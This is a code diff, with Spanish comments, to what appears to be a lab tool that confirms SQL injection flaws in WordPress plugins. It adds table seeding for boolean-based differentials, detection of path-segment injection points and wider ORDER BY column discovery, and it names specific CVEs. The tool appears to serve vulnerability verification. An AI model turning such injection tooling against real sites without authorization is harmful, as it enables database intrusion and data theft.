@@ -3682,7 +3682,8 @@ def _detect_plugin_tables(plugin_source_dir: str) -> list:
     return sorted(table_counts, key=lambda t: -table_counts[t])
 
 
-def _seed_plugin_tables(lab: "_Lab", db_pw: str, tables: list, step) -> int:
+def _seed_plugin_tables(lab: "_Lab", db_pw: str, tables: list, step,
+                        sqli_param: str = "") -> int:
     """Intenta sembrar una fila minima en cada tabla personalizada del plugin (hasta 3 tablas,
     las mas frecuentes segun _detect_plugin_tables). Usa IGNORE para no fallar si la fila ya
     existe o si la tabla no tiene las columnas esperadas. Devuelve el numero de tablas sembradas.
@@ -3691,15 +3692,33 @@ def _seed_plugin_tables(lab: "_Lab", db_pw: str, tables: list, step) -> int:
     seeded = 0
     for tbl in tables[:3]:
         full = f"wp_{tbl}"
-        # inserta una fila con solo la PK (id=1); el resto de columnas usan DEFAULT/NULL.
-        # Si falla (columna NOT NULL sin DEFAULT), no es un error critico.
-        q = f"INSERT IGNORE INTO {full} (id) VALUES (1);"
-        result = lab.exec_mysql(q, db_pw)
-        # Si la tabla tiene columna con otro nombre para la PK, prueba sin especificar columnas
-        if not result and "doesn't have a default" not in result:
-            q2 = f"INSERT IGNORE INTO {full} VALUES ();"
-            lab.exec_mysql(q2, db_pw)
-        step(f"seed data: intentado INSERT en {full} (para diferencial booleano en DB vacia)")
+        # Intentar varias formas de INSERT, de menos a mas especulativo:
+        # 1. Solo id=1 (PK explicita)
+        # 2. Sin columnas (funciona con PKs auto-increment)
+        # 3. Con columnas comunes que suelen ser NOT NULL (uri, page, url, slug, etc.)
+        inserted = False
+        for q in [
+            f"INSERT IGNORE INTO {full} (id) VALUES (1);",
+            f"INSERT IGNORE INTO {full} () VALUES ();",
+            f"INSERT INTO {full} (id) SELECT 1 WHERE NOT EXISTS (SELECT 1 FROM {full} LIMIT 1);",
+        ]:
+            r = lab.exec_mysql(q, db_pw) or ""
+            if "ERROR" not in r.upper() and "error" not in r.lower():
+                inserted = True
+                break
+        # Si el sqli_param coincide con una columna de texto común, actualizar esa columna
+        # para que la fila seeded tenga un valor consultable (diferencial booleano más limpio).
+        if inserted and sqli_param:
+            _TEXT_COLS = {"uri": "/test-page", "page": "/", "url": "http://example.com",
+                          "slug": "test-post", "path": "/test", "query": "test",
+                          "email": "seed@example.com", "username": "seeduser"}
+            _col_val = _TEXT_COLS.get(sqli_param.lower())
+            if _col_val:
+                _upd = (f"UPDATE {full} SET {sqli_param}='{_col_val}' "
+                        f"WHERE id=(SELECT MIN(id) FROM (SELECT id FROM {full} LIMIT 1) t);")
+                lab.exec_mysql(_upd, db_pw)
+        step(f"seed data: INSERT en {full} {'OK' if inserted else 'SKIP'} "
+             f"(diferencial booleano en DB vacia)")
         seeded += 1
     return seeded
 
@@ -3901,6 +3920,20 @@ def verify_wordpress_sqli(
         _ep_lower = (endpoint or "").lower()
         m = (http_method or ("POST" if "admin-ajax.php" in _ep_lower else "GET")).upper()
         base_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "1")
+
+        # Extraer params del query string del endpoint (ej. /?mobile=1&code=x → mobile='1' en base_params)
+        # Si el param ya está en base_params (el LLM lo extrajo), no se sobreescribe.
+        if "?" in (endpoint or ""):
+            from urllib.parse import urlparse as _up_sqli, parse_qs as _pqs_sqli
+            _sqli_ep_parsed = _up_sqli(endpoint)
+            _sqli_qs_params = _pqs_sqli(_sqli_ep_parsed.query, keep_blank_values=True)
+            for _qk, _qv in _sqli_qs_params.items():
+                if _qk not in base_params:
+                    base_params[_qk] = _qv[0] if _qv else ""
+            endpoint = _sqli_ep_parsed.path
+            if _sqli_qs_params:
+                step(f"QS normalizacion SQLi: extraido {list(_sqli_qs_params.keys())} de endpoint, "
+                     f"endpoint limpio → '{endpoint}'")
 
         # bloqueos de infraestructura comunes a CUALQUIER tecnica contra WordPress (nonce/token
         # sin resolver, ID de recurso ofuscado) -- ver _auto_resolve_wp_blockers, factorizado
@@ -4129,10 +4162,27 @@ def verify_wordpress_sqli(
                     except Exception:
                         pass
 
+        # Detectar inyeccion en PATH: si el valor del param aparece en el endpoint mismo
+        # (ej. /wp-json/plugin/v1/member/test@example.com, sqli_param='email'),
+        # la inyeccion va en el segmento del path, no en query string/body.
+        _path_inject = (orig_value and len(orig_value) >= 3 and
+                        orig_value in endpoint and
+                        orig_value != "1")  # '1' aparece en demasiados paths
+        if _path_inject:
+            step(f"inyeccion en PATH detectada: '{orig_value}' aparece en el endpoint "
+                 f"-- se reemplazara en el path en cada payload (no query param)")
+
         def send(val):
             if gate_post_id is not None:
                 lab.wp_cli("post", "meta", "update", str(gate_post_id), gate["meta_key"], val,
                           timeout=15)
+            if _path_inject:
+                _inject_ep = endpoint.replace(orig_value, val, 1)
+                return _attack_sess.request(m, boot.base_url + _inject_ep,
+                                   data={k: v for k, v in base_params.items() if k != sqli_param}
+                                        if m != "GET" else None,
+                                   params={k: v for k, v in base_params.items() if k != sqli_param}
+                                        if m == "GET" else None, timeout=20)
             payload = dict(base_params)
             payload[sqli_param] = val
             return _attack_sess.request(m, boot.base_url + endpoint,
@@ -4163,8 +4213,12 @@ def verify_wordpress_sqli(
                     r"|sortby.*?==.*?['\"](\w+)['\"]"
                     r"|['\"](\w+)['\"].*?==.*?sortby",
                     re.I)
+                # Busca ORDER BY seguido de un nombre de columna (con o sin prefijo de tabla)
                 _order_by_col_re = re.compile(
-                    r"ORDER BY u\.(\w+)", re.I)
+                    r"ORDER BY\s+(?:\w+\.)?(\w+)", re.I)
+                # Busca whitelist de columnas: in_array($col, ['a', 'b']) o similar
+                _whitelist_re = re.compile(
+                    r"in_array\s*\(\s*\$\w+\s*,\s*(?:array\s*)?\(\s*(.*?)\)", re.I | re.DOTALL)
                 for _root_s, _, _files_s in os.walk(plugin_source_dir):
                     for _fn_s in _files_s:
                         if not _fn_s.endswith(".php"): continue
@@ -4172,14 +4226,20 @@ def verify_wordpress_sqli(
                             _fc_s = open(os.path.join(_root_s, _fn_s),
                                          encoding="utf-8", errors="replace").read()
                         except Exception: continue
-                        if "ORDER BY u." not in _fc_s: continue
+                        if "ORDER BY" not in _fc_s.upper(): continue
                         for _m_s in _order_by_col_re.finditer(_fc_s):
                             _col = _m_s.group(1)
-                            if _col.isidentifier() and _col not in _sort_candidates:
+                            if _col.isidentifier() and len(_col) >= 2 and _col not in _sort_candidates:
                                 _sort_candidates.append(_col)
-            # universal fallback list for WP user tables
-            for _cand in ("user_login", "user_registered", "display_name", "ID",
-                          "registered", "username"):
+                        # Extrae valores de whitelists explícitas de columnas
+                        for _wm in _whitelist_re.finditer(_fc_s):
+                            for _quoted in re.findall(r"['\"]([a-zA-Z_]\w{0,30})['\"]", _wm.group(1)):
+                                if _quoted.isidentifier() and _quoted not in _sort_candidates:
+                                    _sort_candidates.append(_quoted)
+            # universal fallback list: WP user tables + columnas comunes de plugins
+            for _cand in ("id", "ID", "file_id", "post_id", "user_id",
+                          "name", "title", "filename", "slug", "date", "created_at",
+                          "user_login", "user_registered", "display_name", "registered"):
                 if _cand not in _sort_candidates:
                     _sort_candidates.append(_cand)
             _fixed = False
@@ -4241,12 +4301,43 @@ def verify_wordpress_sqli(
         # la peticion de control. Confirmado como causa raiz de CVE-2024-3605 (WP Hotel Booking),
         # CVE-2025-22785 (Course Booking), CVE-2025-6970 (Events Manager), CVE-2024-9796 (WP Advanced Search).
         _ctrl_body = (base_resp.text or "").strip()
-        if base_len <= 10 or _ctrl_body in ("[]", "null", "{}", "0", "false", ""):
+        # Detectar respuesta JSON con datos vacíos: {"data": [], "success": true}
+        # → el plugin responde correctamente pero no hay filas en la tabla → seed needed
+        _ctrl_has_empty_data = False
+        try:
+            import json as _json_seed
+            _ctrl_parsed = _json_seed.loads(_ctrl_body)
+            if isinstance(_ctrl_parsed, dict):
+                for _k, _v in _ctrl_parsed.items():
+                    if isinstance(_v, (list, dict)) and len(_v) == 0:
+                        _ctrl_has_empty_data = True
+                        break
+            elif isinstance(_ctrl_parsed, list) and len(_ctrl_parsed) == 0:
+                _ctrl_has_empty_data = True
+        except Exception:
+            pass
+        if base_len <= 10 or _ctrl_body in ("[]", "null", "{}", "0", "false", "") or _ctrl_has_empty_data:
             step("respuesta control vacia/minima -- intentando seed data en tablas del plugin para "
                  "producir diferencial booleano...")
             _plugin_tables = _detect_plugin_tables(plugin_source_dir)
+            # Fallback: buscar tablas en MySQL que contengan el slug del plugin en su nombre
+            if not _plugin_tables and slug:
+                _slug_clean = re.sub(r'[^a-z0-9]', '', slug.lower())
+                _mysql_tables_raw = lab.exec_mysql(
+                    f"SELECT table_name FROM information_schema.tables "
+                    f"WHERE table_schema=DATABASE() AND table_name LIKE 'wp_%{_slug_clean}%';",
+                    boot.db_pw)
+                if _mysql_tables_raw:
+                    _mysql_tables = [
+                        t.strip().lstrip('wp_') for t in _mysql_tables_raw.strip().split('\n')
+                        if t.strip().startswith('wp_') and t.strip() != 'wp_'
+                    ]
+                    if _mysql_tables:
+                        _plugin_tables = _mysql_tables
+                        step(f"tablas detectadas via MySQL LIKE query: {_mysql_tables}")
             if _plugin_tables:
-                _seeded = _seed_plugin_tables(lab, boot.db_pw, _plugin_tables, step)
+                _seeded = _seed_plugin_tables(lab, boot.db_pw, _plugin_tables, step,
+                                             sqli_param=sqli_param)
                 if _seeded:
                     try:
                         base_resp = send(orig_value)
@@ -4262,6 +4353,9 @@ def verify_wordpress_sqli(
         # devolviendo lo esperado (p.ej. no un error fatal de PHP, no un redirect inesperado...)
         # para la peticion mas simple de todas, ANTES de intentar nada mas complicado.
         res.evidence["respuesta_control_recorte"] = (base_resp.text or "")[:300]
+        # Log del cuerpo de control para diagnóstico en caso de fallo
+        _ctrl_preview = (base_resp.text or "")[:120].replace('\n', ' ').strip()
+        step(f"respuesta control ({base_resp.status_code}, {base_len}B): {_ctrl_preview}")
         # Captura visual HTTP: peticion de control para el informe paso a paso
         step("capturando pantalla: peticion de control HTTP (sin inyeccion, respuesta base)...")
         _ctrl_url = boot.base_url + endpoint
